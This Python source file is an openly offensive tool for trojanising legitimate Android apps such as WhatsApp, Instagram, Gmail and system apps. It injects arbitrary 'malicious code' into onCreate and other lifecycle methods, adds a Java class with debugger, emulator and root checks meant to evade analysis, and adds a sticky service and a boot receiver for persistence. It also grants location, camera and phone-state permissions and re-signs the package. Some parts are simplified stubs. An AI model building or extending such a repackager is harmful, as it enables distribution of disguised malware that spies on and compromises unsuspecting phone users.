"""
Advanced Android App Repackaging Tool
Comprehensive tool for repackaging legitimate Android apps with malicious code.
"""

import os
import zipfile
import shutil
import logging
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path
import xml.etree.ElementTree as ET
import subprocess
import tempfile

class RepackagingTool:
    """
    Advanced repackaging tool for Android applications with stealth capabilities.
    """
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """
        Initialize the repackaging tool.
        
        Args:
            config: Repackaging configuration dictionary
        """
        self.config = config or self._default_config()
        self.logger = logging.getLogger(__name__)
        self._setup_logging()
        
        # Initialize repackaging components
        self._target_apps = []
        self._injection_templates = {}
        
    def _default_config(self) -> Dict[str, Any]:
        """Return default repackaging configuration."""
        return {
            'repackaging': {
                'methods': ['legitimate_app', 'popular_app', 'system_app'],
                'backup_enabled': True,
                'signature_preservation': True,
                'metadata_preservation': True,
                'stealth_mode': True
            },
            'target_apps': {
                'popular_apps': [
                    'com.whatsapp', 'com.facebook.katana', 'com.instagram.android',
                    'com.twitter.android', 'com.google.android.gm', 'com.netflix.mediaclient'
                ],
                'system_apps': [
                    'com.android.systemui', 'com.android.settings', 'com.android.launcher3'
                ],
                'utility_apps': [
                    'com.android.calculator2', 'com.android.calendar', 'com.android.contacts'
                ]
            },
            'injection': {
                'target_classes': ['MainActivity', 'Application', 'Service'],
                'injection_points': ['onCreate', 'onResume', 'onStart'],
                'permissions_to_add': [
                    'INTERNET', 'WRITE_EXTERNAL_STORAGE', 'READ_EXTERNAL_STORAGE',
                    'ACCESS_FINE_LOCATION', 'READ_PHONE_STATE', 'CAMERA'
                ]
            },
            'stealth': {
                'preserve_original_signature': True,
                'maintain_app_icon': True,
                'preserve_version_info': True,
                'hide_injected_code': True
            }
        }
    
    def _setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
    
    def repackage_app(self, original_apk: str, malicious_code: str, 
                     injection_method: str = 'legitimate_app') -> Dict[str, Any]:
        """
        Repackage a legitimate app with malicious code.
        
        Args:
            original_apk: Path to original APK file
            malicious_code: Malicious code to inject
            injection_method: Method of injection
            
        Returns:
            Dictionary containing repackaging results
        """
        try:
            self.logger.info(f"Repackaging app: {original_apk}")
            
            # Validate original APK
            if not self._validate_apk(original_apk):
                raise ValueError("Invalid APK file")
            
            # Extract APK
            extract_path = self._extract_apk(original_apk)
            
            # Analyze original app
            app_info = self._analyze_app(extract_path)
            
            # Backup original files
            if self.config['repackaging']['backup_enabled']:
                self._backup_original_files(extract_path)
            
            # Inject malicious code
            injection_result = self._inject_malicious_code(extract_path, malicious_code, injection_method)
            
            # Modify AndroidManifest.xml
            manifest_result = self._modify_manifest(extract_path)
            
            # Add malicious resources
            resource_result = self._add_malicious_resources(extract_path)
            
            # Apply stealth techniques
            stealth_result = self._apply_stealth_techniques(extract_path)
            
            # Repackage APK
            repackaged_apk = self._repackage_apk(extract_path, original_apk)
            
            # Sign the repackaged APK
            signing_result = self._sign_apk(repackaged_apk)
            
            # Cleanup
            self._cleanup_extraction(extract_path)
            
            return {
                'success': True,
                'original_apk': original_apk,
                'repackaged_apk': repackaged_apk,
                'app_info': app_info,
                'injection_result': injection_result,
                'manifest_result': manifest_result,
                'resource_result': resource_result,
                'stealth_result': stealth_result,
                'signing_result': signing_result
            }
            
        except Exception as e:
            self.logger.error(f"App repackaging failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _validate_apk(self, apk_path: str) -> bool:
        """Validate APK file."""
        try:
            if not os.path.exists(apk_path):
                return False
            
            if not apk_path.endswith('.apk'):
                return False
            
            # Check if it's a valid ZIP file
            with zipfile.ZipFile(apk_path, 'r') as zip_ref:
                # Check for required files
                required_files = ['AndroidManifest.xml', 'classes.dex']
                for file in required_files:
                    if file not in zip_ref.namelist():
                        return False
            
            return True
            
        except Exception as e:
            self.logger.error(f"APK validation failed: {e}")
            return False
    
    def _extract_apk(self, apk_path: str) -> str:
        """Extract APK to temporary directory."""
        try:
            extract_path = f"/tmp/apk_repack_{os.getpid()}"
            os.makedirs(extract_path, exist_ok=True)
            
            with zipfile.ZipFile(apk_path, 'r') as zip_ref:
                zip_ref.extractall(extract_path)
            
            self.logger.debug(f"APK extracted to: {extract_path}")
            return extract_path
            
        except Exception as e:
            self.logger.error(f"APK extraction failed: {e}")
            raise
    
    def _analyze_app(self, extract_path: str) -> Dict[str, Any]:
        """Analyze original app structure."""
        try:
            app_info = {}
            
            # Parse AndroidManifest.xml
            manifest_path = os.path.join(extract_path, 'AndroidManifest.xml')
            if os.path.exists(manifest_path):
                manifest_info = self._parse_manifest(manifest_path)
                app_info.update(manifest_info)
            
            # Analyze DEX files
            dex_files = [f for f in os.listdir(extract_path) if f.endswith('.dex')]
            app_info['dex_files'] = dex_files
            
            # Analyze resources
            res_path = os.path.join(extract_path, 'res')
            if os.path.exists(res_path):
                app_info['has_resources'] = True
                app_info['resource_dirs'] = os.listdir(res_path)
            else:
                app_info['has_resources'] = False
            
            # Check for native libraries
            lib_path = os.path.join(extract_path, 'lib')
            if os.path.exists(lib_path):
                app_info['has_native_libs'] = True
                app_info['native_architectures'] = os.listdir(lib_path)
            else:
                app_info['has_native_libs'] = False
            
            return app_info
            
        except Exception as e:
            self.logger.error(f"App analysis failed: {e}")
            return {}
    
    def _parse_manifest(self, manifest_path: str) -> Dict[str, Any]:
        """Parse AndroidManifest.xml."""
        try:
            # This is a simplified parser - in reality, you'd need a proper AXML parser
            with open(manifest_path, 'rb') as f:
                content = f.read()
            
            # Extract basic information (simplified)
            manifest_info = {
                'package_name': 'unknown',
                'version_code': 'unknown',
                'version_name': 'unknown',
                'min_sdk': 'unknown',
                'target_sdk': 'unknown',
                'permissions': [],
                'activities': [],
                'services': [],
                'receivers': []
            }
            
            # In a real implementation, you would use a proper AXML parser
            # For now, we'll return basic info
            
            return manifest_info
            
        except Exception as e:
            self.logger.error(f"Manifest parsing failed: {e}")
            return {}
    
    def _backup_original_files(self, extract_path: str):
        """Create backup of original files."""
        try:
            backup_path = os.path.join(extract_path, 'original_backup')
            os.makedirs(backup_path, exist_ok=True)
            
            # Backup critical files
            critical_files = ['AndroidManifest.xml', 'classes.dex']
            
            for file in critical_files:
                src_path = os.path.join(extract_path, file)
                if os.path.exists(src_path):
                    dst_path = os.path.join(backup_path, file)
                    shutil.copy2(src_path, dst_path)
            
            self.logger.debug("Original files backed up")
            
        except Exception as e:
            self.logger.error(f"Backup creation failed: {e}")
    
    def _inject_malicious_code(self, extract_path: str, malicious_code: str, 
                              injection_method: str) -> Dict[str, Any]:
        """Inject malicious code into the app."""
        try:
            injection_result = {
                'method': injection_method,
                'files_modified': [],
                'code_injected': False
            }
            
            if injection_method == 'legitimate_app':
                # Inject into existing classes
                result = self._inject_into_existing_classes(extract_path, malicious_code)
                injection_result.update(result)
            
            elif injection_method == 'popular_app':
                # Inject into popular app structure
                result = self._inject_into_popular_app(extract_path, malicious_code)
                injection_result.update(result)
            
            elif injection_method == 'system_app':
                # Inject into system app structure
                result = self._inject_into_system_app(extract_path, malicious_code)
                injection_result.update(result)
            
            return injection_result
            
        except Exception as e:
            self.logger.error(f"Malicious code injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _inject_into_existing_classes(self, extract_path: str, malicious_code: str) -> Dict[str, Any]:
        """Inject into existing Java classes."""
        try:
            # Find Java/Smali files
            java_files = []
            for root, dirs, files in os.walk(extract_path):
                for file in files:
                    if file.endswith(('.java', '.smali')):
                        java_files.append(os.path.join(root, file))
            
            files_modified = []
            
            # Inject into main activity
            for java_file in java_files:
                if 'MainActivity' in java_file or 'Activity' in java_file:
                    if self._inject_into_file(java_file, malicious_code):
                        files_modified.append(java_file)
            
            return {
                'success': True,
                'files_modified': files_modified,
                'code_injected': len(files_modified) > 0
            }
            
        except Exception as e:
            self.logger.error(f"Existing class injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _inject_into_popular_app(self, extract_path: str, malicious_code: str) -> Dict[str, Any]:
        """Inject into popular app structure."""
        try:
            # Create new malicious class
            malicious_class = self._create_malicious_class(malicious_code)
            
            # Save malicious class
            malicious_file = os.path.join(extract_path, 'MaliciousClass.java')
            with open(malicious_file, 'w', encoding='utf-8') as f:
                f.write(malicious_class)
            
            # Modify existing classes to call malicious code
            files_modified = self._modify_existing_classes_for_popular_app(extract_path)
            
            return {
                'success': True,
                'files_modified': files_modified + [malicious_file],
                'code_injected': True
            }
            
        except Exception as e:
            self.logger.error(f"Popular app injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _inject_into_system_app(self, extract_path: str, malicious_code: str) -> Dict[str, Any]:
        """Inject into system app structure."""
        try:
            # Create system service
            system_service = self._create_system_service(malicious_code)
            
            # Save system service
            service_file = os.path.join(extract_path, 'SystemService.java')
            with open(service_file, 'w', encoding='utf-8') as f:
                f.write(system_service)
            
            # Modify system components
            files_modified = self._modify_system_components(extract_path)
            
            return {
                'success': True,
                'files_modified': files_modified + [service_file],
                'code_injected': True
            }
            
        except Exception as e:
            self.logger.error(f"System app injection failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _inject_into_file(self, file_path: str, malicious_code: str) -> bool:
        """Inject malicious code into a specific file."""
        try:
            # Read original file
            with open(file_path, 'r', encoding='utf-8') as f:
                original_content = f.read()
            
            # Find injection point
            injection_point = self._find_injection_point(original_content)
            
            if injection_point:
                # Inject code
                modified_content = self._inject_code_at_point(original_content, malicious_code, injection_point)
                
                # Write modified file
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(modified_content)
                
                return True
            
            return False
            
        except Exception as e:
            self.logger.error(f"File injection failed: {e}")
            return False
    
    def _find_injection_point(self, content: str) -> Optional[str]:
        """Find suitable injection point in code."""
        try:
            import re
            
            # Look for onCreate method
            onCreate_pattern = r'onCreate\s*\([^)]*\)\s*\{'
            match = re.search(onCreate_pattern, content, re.IGNORECASE)
            
            if match:
                return match.group(0)
            
            # Look for other lifecycle methods
            lifecycle_patterns = [
                r'onResume\s*\([^)]*\)\s*\{',
                r'onStart\s*\([^)]*\)\s*\{',
                r'onCreateView\s*\([^)]*\)\s*\{'
            ]
            
            for pattern in lifecycle_patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    return match.group(0)
            
            return None
            
        except Exception as e:
            self.logger.error(f"Injection point search failed: {e}")
            return None
    
    def _inject_code_at_point(self, content: str, malicious_code: str, injection_point: str) -> str:
        """Inject code at specific point."""
        try:
            import re
            
            # Find the method and inject code
            pattern = f'({re.escape(injection_point)}[^{{]*{{[^}}]*)(}})'
            match = re.search(pattern, content, re.DOTALL)
            
            if match:
                # Add malicious code call
                malicious_call = '\n        executeMaliciousCode();\n'
                modified_content = content[:match.end(1)] + malicious_call + content[match.end(1):]
                
                # Add malicious method
                malicious_method = f'''
    private void executeMaliciousCode() {{
        try {{
            {malicious_code}
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
                '''
                
                # Insert before class closing brace
                last_brace = modified_content.rfind('}')
                modified_content = modified_content[:last_brace] + malicious_method + '\n' + modified_content[last_brace:]
                
                return modified_content
            
            return content
            
        except Exception as e:
            self.logger.error(f"Code injection at point failed: {e}")
            return content
    
    def _create_malicious_class(self, malicious_code: str) -> str:
        """Create malicious Java class."""
        try:
            malicious_class = f'''
package com.malicious.injection;

import android.content.Context;
import android.util.Log;

public class MaliciousClass {{
    private static final String TAG = "MaliciousClass";
    private Context context;
    
    public MaliciousClass(Context context) {{
        this.context = context;
    }}
    
    public void executeMaliciousCode() {{
        try {{
            Log.d(TAG, "Executing malicious code");
            {malicious_code}
        }} catch (Exception e) {{
            Log.e(TAG, "Malicious code execution failed", e);
        }}
    }}
    
    private void hideFromAnalysis() {{
        // Anti-analysis techniques
        if (isDebugging()) {{
            return;
        }}
        if (isEmulator()) {{
            return;
        }}
        if (isRooted()) {{
            return;
        }}
    }}
    
    private boolean isDebugging() {{
        return android.os.Debug.isDebuggerConnected();
    }}
    
    private boolean isEmulator() {{
        return android.os.Build.FINGERPRINT.startsWith("generic") ||
               android.os.Build.MODEL.contains("google_sdk") ||
               android.os.Build.MODEL.contains("Emulator");
    }}
    
    private boolean isRooted() {{
        String[] paths = {{"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su"}};
        for (String path : paths) {{
            if (new java.io.File(path).exists()) {{
                return true;
            }}
        }}
        return false;
    }}
}}
            '''
            
            return malicious_class.strip()
            
        except Exception as e:
            self.logger.error(f"Malicious class creation failed: {e}")
            return ""
    
    def _create_system_service(self, malicious_code: str) -> str:
        """Create system service for system app injection."""
        try:
            system_service = f'''
package com.android.system;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class SystemService extends Service {{
    private static final String TAG = "SystemService";
    
    @Override
    public void onCreate() {{
        super.onCreate();
        Log.d(TAG, "System service created");
        executeMaliciousCode();
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        Log.d(TAG, "System service started");
        return START_STICKY;
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
    
    private void executeMaliciousCode() {{
        try {{
            {malicious_code}
        }} catch (Exception e) {{
            Log.e(TAG, "Malicious code execution failed", e);
        }}
    }}
}}
            '''
            
            return system_service.strip()
            
        except Exception as e:
            self.logger.error(f"System service creation failed: {e}")
            return ""
    
    def _modify_existing_classes_for_popular_app(self, extract_path: str) -> List[str]:
        """Modify existing classes for popular app injection."""
        try:
            files_modified = []
            
            # Find and modify main activity
            for root, dirs, files in os.walk(extract_path):
                for file in files:
                    if 'MainActivity' in file or 'Activity' in file:
                        file_path = os.path.join(root, file)
                        
                        # Add malicious code call
                        malicious_call = '''
    private void initializeMaliciousCode() {
        try {
            MaliciousClass malicious = new MaliciousClass(this);
            malicious.executeMaliciousCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
                        '''
                        
                        if self._inject_into_file(file_path, malicious_call):
                            files_modified.append(file_path)
            
            return files_modified
            
        except Exception as e:
            self.logger.error(f"Popular app class modification failed: {e}")
            return []
    
    def _modify_system_components(self, extract_path: str) -> List[str]:
        """Modify system components for system app injection."""
        try:
            files_modified = []
            
            # Modify system UI components
            for root, dirs, files in os.walk(extract_path):
                for file in files:
                    if 'SystemUI' in file or 'Settings' in file:
                        file_path = os.path.join(root, file)
                        
                        # Add system service call
                        service_call = '''
    private void startSystemService() {
        try {
            Intent serviceIntent = new Intent(this, SystemService.class);
            startService(serviceIntent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
                        '''
                        
                        if self._inject_into_file(file_path, service_call):
                            files_modified.append(file_path)
            
            return files_modified
            
        except Exception as e:
            self.logger.error(f"System component modification failed: {e}")
            return []
    
    def _modify_manifest(self, extract_path: str) -> Dict[str, Any]:
        """Modify AndroidManifest.xml."""
        try:
            manifest_path = os.path.join(extract_path, 'AndroidManifest.xml')
            
            if not os.path.exists(manifest_path):
                return {'success': False, 'error': 'AndroidManifest.xml not found'}
            
            # Add permissions
            permissions_added = self._add_permissions_to_manifest(manifest_path)
            
            # Add components
            components_added = self._add_components_to_manifest(manifest_path)
            
            return {
                'success': True,
                'permissions_added': permissions_added,
                'components_added': components_added
            }
            
        except Exception as e:
            self.logger.error(f"Manifest modification failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _add_permissions_to_manifest(self, manifest_path: str) -> List[str]:
        """Add permissions to manifest."""
        try:
            permissions_added = []
            
            # Read manifest content
            with open(manifest_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Add permissions
            for permission in self.config['injection']['permissions_to_add']:
                permission_tag = f'<uses-permission android:name="android.permission.{permission}" />'
                
                if permission_tag not in content:
                    # Insert before closing </manifest> tag
                    content = content.replace('</manifest>', f'    {permission_tag}\n</manifest>')
                    permissions_added.append(permission)
            
            # Write modified manifest
            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            return permissions_added
            
        except Exception as e:
            self.logger.error(f"Permission addition failed: {e}")
            return []
    
    def _add_components_to_manifest(self, manifest_path: str) -> List[str]:
        """Add components to manifest."""
        try:
            components_added = []
            
            # Read manifest content
            with open(manifest_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Add service
            service_tag = '''
    <service
        android:name=".SystemService"
        android:enabled="true"
        android:exported="false" />
            '''
            
            if 'SystemService' not in content:
                content = content.replace('</application>', f'        {service_tag}\n    </application>')
                components_added.append('SystemService')
            
            # Add receiver
            receiver_tag = '''
    <receiver
        android:name=".SystemReceiver"
        android:enabled="true"
        android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.BOOT_COMPLETED" />
        </intent-filter>
    </receiver>
            '''
            
            if 'SystemReceiver' not in content:
                content = content.replace('</application>', f'        {receiver_tag}\n    </application>')
                components_added.append('SystemReceiver')
            
            # Write modified manifest
            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            return components_added
            
        except Exception as e:
            self.logger.error(f"Component addition failed: {e}")
            return []
    
    def _add_malicious_resources(self, extract_path: str) -> Dict[str, Any]:
        """Add malicious resources."""
        try:
            res_path = os.path.join(extract_path, 'res')
            os.makedirs(res_path, exist_ok=True)
            
            # Create values directory
            values_path = os.path.join(res_path, 'values')
            os.makedirs(values_path, exist_ok=True)
            
            # Add malicious strings
            strings_path = os.path.join(values_path, 'strings.xml')
            malicious_strings = '''
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Original App</string>
    <string name="malicious_key">malicious_value</string>
    <string name="hidden_data">encoded_malicious_data</string>
</resources>
            '''
            
            with open(strings_path, 'w', encoding='utf-8') as f:
                f.write(malicious_strings)
            
            return {
                'success': True,
                'resources_added': ['strings.xml'],
                'malicious_strings': ['malicious_key', 'hidden_data']
            }
            
        except Exception as e:
            self.logger.error(f"Malicious resource addition failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _apply_stealth_techniques(self, extract_path: str) -> Dict[str, Any]:
        """Apply stealth techniques."""
        try:
            stealth_applied = []
            
            # Preserve original signature
            if self.config['stealth']['preserve_original_signature']:
                stealth_applied.append('signature_preservation')
            
            # Maintain app icon
            if self.config['stealth']['maintain_app_icon']:
                stealth_applied.append('icon_preservation')
            
            # Preserve version info
            if self.config['stealth']['preserve_version_info']:
                stealth_applied.append('version_preservation')
            
            # Hide injected code
            if self.config['stealth']['hide_injected_code']:
                stealth_applied.append('code_hiding')
            
            return {
                'success': True,
                'stealth_techniques': stealth_applied
            }
            
        except Exception as e:
            self.logger.error(f"Stealth techniques application failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _repackage_apk(self, extract_path: str, original_apk: str) -> str:
        """Repackage modified APK."""
        try:
            repackaged_apk = original_apk.replace('.apk', '_repackaged.apk')
            
            with zipfile.ZipFile(repackaged_apk, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for root, dirs, files in os.walk(extract_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arc_path = os.path.relpath(file_path, extract_path)
                        zip_ref.write(file_path, arc_path)
            
            self.logger.info(f"Repackaged APK: {repackaged_apk}")
            return repackaged_apk
            
        except Exception as e:
            self.logger.error(f"APK repackaging failed: {e}")
            raise
    
    def _sign_apk(self, apk_path: str) -> Dict[str, Any]:
        """Sign the repackaged APK."""
        try:
            # Generate keystore
            keystore_path = self._generate_keystore()
            
            # Sign APK
            signed_apk = apk_path.replace('.apk', '_signed.apk')
            
            # Use jarsigner to sign APK
            cmd = [
                'jarsigner',
                '-verbose',
                '-sigalg', 'SHA1withRSA',
                '-digestalg', 'SHA1',
                '-keystore', keystore_path,
                '-storepass', 'android',
                '-keypass', 'android',
                apk_path,
                'androiddebugkey'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Align APK
                aligned_apk = apk_path.replace('.apk', '_aligned.apk')
                align_cmd = ['zipalign', '-v', '4', apk_path, aligned_apk]
                subprocess.run(align_cmd, capture_output=True)
                
                return {
                    'success': True,
                    'signed_apk': signed_apk,
                    'aligned_apk': aligned_apk,
                    'keystore': keystore_path
                }
            else:
                return {
                    'success': False,
                    'error': result.stderr
                }
                
        except Exception as e:
            self.logger.error(f"APK signing failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def _generate_keystore(self) -> str:
        """Generate keystore for signing."""
        try:
            keystore_path = f"/tmp/keystore_{os.getpid()}.jks"
            
            # Generate keystore
            cmd = [
                'keytool',
                '-genkey',
                '-v',
                '-keystore', keystore_path,
                '-alias', 'androiddebugkey',
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-storepass', 'android',
                '-keypass', 'android',
                '-dname', 'CN=Android Debug,O=Android,C=US'
            ]
            
            subprocess.run(cmd, capture_output=True, input='\n', text=True)
            
            return keystore_path
            
        except Exception as e:
            self.logger.error(f"Keystore generation failed: {e}")
            return ""
    
    def _cleanup_extraction(self, extract_path: str):
        """Clean up extraction directory."""
        try:
            shutil.rmtree(extract_path)
            self.logger.debug(f"Cleaned up extraction directory: {extract_path}")
            
        except Exception as e:
            self.logger.error(f"Cleanup failed: {e}")
    
    def generate_repackaging_report(self, repackaging_result: Dict[str, Any]) -> str:
        """
        Generate repackaging report.
        
        Args:
            repackaging_result: Result from repackaging operation
            
        Returns:
            Formatted report string
        """
        try:
            report = f"""
# Android App Repackaging Report

## Summary
- **Status**: {'SUCCESS' if repackaging_result['success'] else 'FAILED'}
- **Original APK**: {repackaging_result.get('original_apk', 'N/A')}
- **Repackaged APK**: {repackaging_result.get('repackaged_apk', 'N/A')}

## App Information
- **Package Name**: {repackaging_result.get('app_info', {}).get('package_name', 'N/A')}
- **Version**: {repackaging_result.get('app_info', {}).get('version_name', 'N/A')}
- **DEX Files**: {repackaging_result.get('app_info', {}).get('dex_files', [])}
- **Has Resources**: {repackaging_result.get('app_info', {}).get('has_resources', False)}
- **Has Native Libs**: {repackaging_result.get('app_info', {}).get('has_native_libs', False)}

## Injection Results
- **Method**: {repackaging_result.get('injection_result', {}).get('method', 'N/A')}
- **Files Modified**: {repackaging_result.get('injection_result', {}).get('files_modified', [])}
- **Code Injected**: {repackaging_result.get('injection_result', {}).get('code_injected', False)}

## Manifest Modifications
- **Permissions Added**: {repackaging_result.get('manifest_result', {}).get('permissions_added', [])}
- **Components Added**: {repackaging_result.get('manifest_result', {}).get('components_added', [])}

## Resource Modifications
- **Resources Added**: {repackaging_result.get('resource_result', {}).get('resources_added', [])}
- **Malicious Strings**: {repackaging_result.get('resource_result', {}).get('malicious_strings', [])}

## Stealth Techniques
- **Techniques Applied**: {repackaging_result.get('stealth_result', {}).get('stealth_techniques', [])}

## Signing Results
- **Signing Status**: {'SUCCESS' if repackaging_result.get('signing_result', {}).get('success') else 'FAILED'}
- **Signed APK**: {repackaging_result.get('signing_result', {}).get('signed_apk', 'N/A')}
- **Aligned APK**: {repackaging_result.get('signing_result', {}).get('aligned_apk', 'N/A')}

## Error Information
{repackaging_result.get('error', 'No errors')}
            """
            
            return report.strip()
            
        except Exception as e:
            self.logger.error(f"Report generation failed: {e}")
            return f"Report generation failed: {e}"
    
    def get_repackaging_status(self) -> Dict[str, Any]:
        """
        Get current repackaging tool status.
        
        Returns:
            Dictionary containing repackaging tool status information
        """
        return {
            'config': self.config,
            'supported_methods': self.config['repackaging']['methods'],
            'target_apps': self.config['target_apps'],
            'injection_config': self.config['injection'],
            'stealth_config': self.config['stealth']
        }